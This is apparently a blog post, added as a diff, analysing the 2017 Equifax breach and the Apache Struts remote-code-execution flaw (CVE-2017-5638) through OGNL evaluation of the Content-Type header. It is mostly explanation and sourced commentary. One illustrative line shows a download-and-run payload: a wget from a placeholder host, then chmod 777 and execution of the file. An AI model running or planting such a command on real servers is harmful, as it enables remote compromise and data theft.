@@ -1,0 +1,46 @@
+---
+layout: post
+comments: true
+title:  "The Equifax Breach"
+excerpt: "A Comprehensive Investigation of the Equifax Security Incident."
+date:   2017-11-07 11:00:00
+mathjax: false
+---
+
+- The Breach
+
+On Sept 7, Equifax, one of the three biggest credit monitoring companies, announced a major data breach. Hackers broke into the company’s database and stole private information from 143 million people, nearly half of the adult population in America (Thomas, 2017).
+This is not the first major data breach in America. In 2013, information from one billion accounts was compromised during a cyber-attack on Yahoo. In 2014, at Yahoo again, another 500 million passwords and account information were exposed (Yahoo breaches n.d.).
+However, the Equifax breach is one of the worst of its kind. Because the information exposed is highly sensitive, including names, birthdays, addresses, social security numbers and even driver’s license numbers (Thomas, 2017). Fraudsters dream of exactly this type of information. They will be able to apply for credit cards and open bank accounts in another person’s name. In the worst scenario, they can print fake IDs and commit crimes using other people’s identities. Many customers became victims without having heard of Equifax. Yet Equifax holds a full set of credit information about them and maintains this information so poorly.
+
+The specific vulnerability of this breach lay in Apache Struts, a widely used framework for building web applications. Equifax uses Apache Struts to build its website server. Early in 2017, Apache Struts was found vulnerable to remote command execution (RCE). The flaw was labeled CVE 2017-5638 and soon patched on March 06 (Thomas, 2017). A simple software update will keep websites away from this kind of attack.
+
+Surprisingly, as a company carrying so much sensitive information, Equifax ignored the important patch. They said that this breach on their website began in mid-May, two months later after the patch was available (Goodin, 2017). Actually, since the publication of the patch, the flaw has been widely discussed and analyzed. Demonstration exploits are available on Github. Even nonexperts are able to download example code and perform RCE attack on websites using unpatched Apache Struts. Unfortunately, Equifax is one such site. It was like a fat rabbit striding in a dangerous woods that finally caught the attention of a hungry predator.
+
+- The Attack Scenario
+
+When a client sends an HTTP request to a server running Apache Struts, a content-type specification is passed along with this request. If the content-type is not valid, an exception will be raised. Then a function named “LocalizedTextUtil.findText” will be called. It will use the invalid content-type to build error message for clients. During the process, the function will evaluate the supplied message. Anything within ${...} in this message will be evaluated as an Object Graph Navigation Library (OGNL) expression. If the OGNL expression is a function call, this expression will be executed (Sahu, 2017).
+
+If a content-type message is deliberately made up by an attacker, evaluation of this message as OGNL expression will enable the attacker to execute any commands on servers. To make matters worse, attackers can redirect outputs of executions to the feedback to them. In this way, they can see results of executions and do further damage, for example, locating and transferring critical data (Sahu, 2017). A typical RCE attack is to download and run malicious files on host machines. (As illustrated by the code follows.)
+#cmds=({'wget –c http://www.xxx.com/fileX; chmod 777 fileX;./fileX;'})
+
+The flaw was patched by disabling the use of “LocalizedTextUtil.findText” function. Although it was patched on March 6, many websites didn’t get updates in time. Shortly after the update was available, the number of attacks exploiting this bug grew dramatically (Goodin, 2017). It seemed that many attackers were not aware of the bug until it was officially announced. And they reacted to it more quickly than programmers maintaining those vulnerable websites, if there were any maintainer at all.
+
+- Security Flaw Summary
+
+	During this incident, three things are noticeable. The first is the execution of content-type message. The content-type messages are essentially strings from users. They are not expected to be and should never be executed. Second, the OGNL expressions make it very convenient to manipulate Java objects. Meanwhile, they bring a number of vulnerabilities to the Struts framework (Munoz, 2014), the building block of numerous websites around the world. At last, the breach would not have happened without the failure to patch a two-month-old flaw. It is hard to imagine that such a company as Equifax is so ignorant of security.
+
+- Bibliography
+
+[1] Goodin, D. (2017, Sept 13). Failure to patch two-month-old bug led to massive Equifax breach. Ars Technica. Retrieved from https://arstechnica.com
+
+[2] Goodin, D. (2017, March 14). In-the-wild exploits ramp up against high-impact sites using Apache Struts. Ars Technica. Retrieved from https://arstechnica.com
+
+[3] Munoz, A. (2014, Jan 14). Struts 2: OGNL Expression Injections. Micro Focus. Retrieved from https://community.saas.hpe.com
+
+[4] Thomas, Fox. (2017, Sept 14). How Hackers Broke Equifax: Exploiting a Patchable Vulnerability Forbes. Retrieved from https://www.forbes.com
+
+[5] Sahu, S. (2017, March 3). CVE-2017-5638: Apache Struts 2 Vulnerability Leads to Remote Code Execution. Trend Micro. Retrieved from http://blog.trendmicro.com/
+
+[6] Yahoo breaches. (n.d.). Wikipedia. Retrieved September 26, 2017, from https://en.wikipedia.org/wiki
+/Yahoo!_data_breaches
